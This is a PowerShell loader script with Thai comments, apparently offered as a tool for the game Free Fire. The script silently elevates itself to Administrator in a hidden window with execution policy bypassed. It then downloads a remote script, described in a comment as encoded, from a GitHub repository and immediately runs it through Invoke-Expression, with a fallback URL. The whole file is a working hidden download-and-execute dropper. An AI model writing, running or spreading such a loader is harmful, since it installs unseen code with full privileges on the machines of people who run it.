# ==========================================
# main.ps1 - ตัว Loader หลักสำหรับเรียกใช้งาน
# ==========================================

# 1. ตรวจสอบและขอสิทธิ์ Administrator แบบซ่อนหน้าต่าง (Hidden)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # สั่งให้รันตัวเองใหม่อีกครั้งด้วยสิทธิ์ Admin แบบซ่อนหน้าต่าง พ่วงท้ายด้วย ExecutionPolicy Bypass
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((irm 'https://raw.githubusercontent.com/potae112/Cmdfreefire/refs/heads/main/main.ps1' -UseBasicParsing))`"" -Verb RunAs
    exit
}

# 2. ลิงก์ดึงสคริปต์ dugduy.ps1 
# (แปลงจากลิงก์ blob ที่คุณแจ้ง มาเป็นลิงก์ raw เพื่อดึงเฉพาะเนื้อหาโค้ดอย่างถูกต้อง)
$dugduyUrl = "https://raw.githubusercontent.com/potae112/Cmdfreefire/refs/heads/main/dugduy.ps1"

try {
    # ดาวน์โหลดเนื้อหาโค้ดที่เข้ารหัสไว้จาก GitHub
    $scriptContent = Invoke-RestMethod -Uri $dugduyUrl -UseBasicParsing
    
    # สั่งรันสคริปต์ dugduy.ps1 ที่ดึงมาทันที
    Invoke-Expression $scriptContent
} catch {
    # เผื่อไว้ในกรณีที่ลิงก์ด้านบนมีการเปลี่ยนโครงสร้าง ให้ดึงจากลิงก์สำรองนี้แทน
    $backupUrl = "https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1"
    $scriptContent = Invoke-RestMethod -Uri $backupUrl -UseBasicParsing
    Invoke-Expression $scriptContent
}